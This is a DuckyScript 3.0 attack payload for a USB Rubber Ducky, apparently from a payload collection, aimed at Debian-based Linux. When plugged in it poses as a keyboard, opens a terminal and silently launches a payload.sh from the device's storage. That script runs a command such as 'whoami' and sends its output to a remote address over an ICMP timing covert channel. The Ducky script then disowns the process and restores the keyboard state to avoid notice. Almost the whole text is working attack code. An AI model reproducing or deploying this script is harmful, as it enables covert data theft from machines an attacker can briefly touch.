REM TITLE : ICMP - Timing-Based Data Exfiltration
REM AUTHOR : TW-D
REM TARGET : Debian-Based Linux Distributions
REM VERSION : 1.0
REM CATEGORY : Exfiltration (covert channel)
REM REQUIREMENT : DuckyScript 3.0

ATTACKMODE HID STORAGE
DELAY 15000

REM ---
REM USB Rubber Ducky label.
REM ---
DEFINE #RD_LABEL DUCKY

REM ---
REM Command line to be executed by the target computer.
REM ---
DEFINE #SYSTEM_COMMAND "whoami"

REM ---
REM Remote address where ICMP packets will be sent.
REM ---
DEFINE #REMOTE_ADDRESS "127.0.0.1"

SAVE_HOST_KEYBOARD_LOCK_STATE

IF ( $_CAPSLOCK_ON ) THEN
    CAPSLOCK
    DELAY 500
END_IF

CTRL-ALT t
DELAY 2000
STRINGLN  nohup "${BASH}" /media/"${USER}"/#RD_LABEL/payload.sh #SYSTEM_COMMAND #REMOTE_ADDRESS &> /dev/null &
DELAY 1500
STRINGLN  disown && exit

RESTORE_HOST_KEYBOARD_LOCK_STATE

ATTACKMODE OFF
